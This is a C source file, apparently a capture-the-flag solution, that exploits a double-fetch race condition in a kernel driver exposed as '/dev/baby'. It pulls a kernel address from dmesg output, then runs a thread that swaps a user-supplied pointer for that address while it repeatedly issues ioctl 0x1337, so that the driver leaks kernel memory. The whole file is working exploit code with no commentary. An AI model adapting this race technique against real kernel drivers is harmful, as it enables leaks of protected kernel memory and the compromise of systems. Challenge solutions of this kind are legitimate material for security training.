// gcc -static exp.c -lpthread -o exp
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000
#define LEN 0x1000

struct attr
{
    char *flag;
    size_t len;
};
unsigned long long addr;
int finish =0;
char buf[LEN+1]={0};
void change_attr_value(void *s){
    struct attr * s1 = s; 
    while(finish==0){
    s1->flag = addr;
    }
}

int main(void)
{
 

    int addr_fd;
    char *idx;

    int fd = open("/dev/baby",0);
    int ret = ioctl(fd,0x6666);    
    pthread_t t1;
    struct attr t;

    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);   

    system("dmesg > /tmp/record.txt");
    addr_fd = open("/tmp/record.txt",O_RDONLY);
    lseek(addr_fd,-LEN,SEEK_END);
    read(addr_fd,buf,LEN);
    close(addr_fd);
    idx = strstr(buf,"Your flag is at ");
    if (idx == 0){
        printf("[-]Not found addr");
        exit(-1);
    }
    else{
        idx+=16;
        addr = strtoull(idx,idx+16,16);
        printf("[+]flag addr: %p\n",addr);
    }

    t.len = 33;
    t.flag = buf;
    pthread_create(&t1, NULL, change_attr_value,&t);
    for(int i=0;i<TRYTIME;i++){
        ret = ioctl(fd, 0x1337, &t);
        t.flag = buf;
    }
    finish = 1;
    pthread_join(t1, NULL);
    close(fd);
    puts("[+]result is :");
    system("dmesg | grep flag");
    return 0;
}
